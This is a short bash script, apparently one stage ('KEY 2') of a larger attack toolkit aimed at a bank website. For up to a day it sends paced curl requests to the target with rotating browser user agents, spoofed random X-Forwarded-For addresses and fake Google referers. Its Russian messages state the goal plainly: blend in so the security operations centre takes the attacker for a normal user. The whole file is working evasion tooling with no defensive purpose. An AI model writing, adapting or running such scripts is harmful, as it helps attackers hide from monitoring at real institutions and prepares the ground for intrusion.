#!/bin/bash
TARGET=$1
[ -z "$TARGET" ] && { echo "Usage: $0 https://bank.com [duration_hours]"; exit 1; }
DOMAIN=$(echo "$TARGET" | sed 's|https\?://||;s|/.*||')
HOURS=${2:-24}
KEY2_DIR="$HOME/.shadow_keys/$DOMAIN/key2_blend"
mkdir -p "$KEY2_DIR"

echo "[КЛЮЧ 2] 🦎 Сливаюсь с трафиком на ${HOURS}ч..."

END_TIME=$(($(date +%s) + HOURS * 3600))
REQUEST_COUNT=0

while [ $(date +%s) -lt $END_TIME ]; do
    IP="$((RANDOM % 255)).$((RANDOM % 255)).$((RANDOM % 255)).$((RANDOM % 255))"
    UAS=(
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0"
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15"
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0) Mobile/15E148"
    )
    UA="${UAS[$((RANDOM % 3))]}"

    # Легитимные запросы с разными интервалами
    curl -sk --max-time 3 \
        -H "User-Agent: $UA" \
        -H "X-Forwarded-For: $IP" \
        -H "Accept: text/html,application/xhtml+xml" \
        -H "Accept-Language: en-US,en;q=0.9" \
        -H "Referer: https://google.com/search?q=$(echo $RANDOM | base64)" \
        "$TARGET" -o /dev/null 2>/dev/null

    REQUEST_COUNT=$((REQUEST_COUNT + 1))
    [ $((REQUEST_COUNT % 100)) -eq 0 ] && echo "  📊 $REQUEST_COUNT запросов..."

    # Случайная пауза от 30 до 300 секунд
    sleep $((RANDOM % 270 + 30))
done

echo "[КЛЮЧ 2] ✅ $REQUEST_COUNT легитимных запросов. SOC считает нас обычным пользователем."
echo "[КЛЮЧ 2] 📁 $KEY2_DIR/"
